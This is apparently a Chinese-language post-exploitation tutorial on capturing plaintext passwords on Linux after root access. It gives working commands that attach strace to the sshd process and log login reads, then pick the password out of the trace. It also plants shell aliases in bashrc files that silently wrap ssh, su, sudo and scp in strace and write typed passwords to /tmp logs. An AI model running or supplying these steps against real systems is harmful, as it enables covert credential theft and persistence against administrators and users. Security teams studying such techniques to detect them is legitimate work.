在window下获取到administraot权限以后，使用mimikatz不管是抓取明文密码或是hash都很方便，但是在Linux就算获取到root权限了，获取hash倒是很简单cat一下就行，但是大概率很难解密出来。那么如何在Linux抓取root用户的明文密码？

使用strace抓取密码

strace是一个可用于诊断、调试和教学的Linux用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。
strace底层使用内核的ptrace特性来实现其功能。

在运维的日常工作中，故障处理和问题诊断是个主要的内容，也是必备的技能。strace作为一种动态跟踪工具，能够帮助运维高效地定位进程和服务故障。它像是一个侦探，通过系统调用的蛛丝马迹，告诉你异常的真相。
最重要的是，一般在Linux发行版下都已经默认安装了，无需自行安装。

使用strace抓取密码，必须要管理员登录才行
第一种：
我们可以使用last命令来查看管理员最后登录的时间，登录顺序，由近到远
首先ps -elf |grep sshd 找到sshd的pid,使用nohup strace -f -p pid -o sshd.out.txt &来跟踪sshd进程
然后当管理员使用密码登录以后，下载 sshd.out.txt文件,在文件中搜索read(7, "\f\0\0\0\f,字符串后面的即是明文密码

第二种：
在获取到目标ROOT权限后，可以直接在终端执行如下命令，该命令会监听sshd进程，并将登录过程及信息记录到/tmp/sshd.log文件中。
Default
(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/sshd.log &)

alias命令

首先编辑bashrc文件, vi ~/.bashrc[当前用户] 或者vi /etc/bashrc[所有用户]然后将如下命令加入文件当中并保存，注意strace权限问题。
Default
alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s 2048 ssh'

然后要记得使用source .bashrc命令使更改的配置生效。
接着使用如下命令查看记录的密码。
cat /tmp/sshpwd*.log
密码会以一行一个字符的方式来记录。
使用su、sudo、scp等命令也可以。
Default
alias su='strace -o /tmp/supwd-`date '+%d%h%m%s'`.log -e read,write,connect -s 2048 su'
  
alias sudo='strace -o /tmp/sudopwd-`date '+%d%h%m%s'`.log -e read,write,connect -s 2048 sudo'
alias scp='strace -o /tmp/scppwd-`date '+%d%h%m%s'`.log -e read,write,connect -s 2048 scp'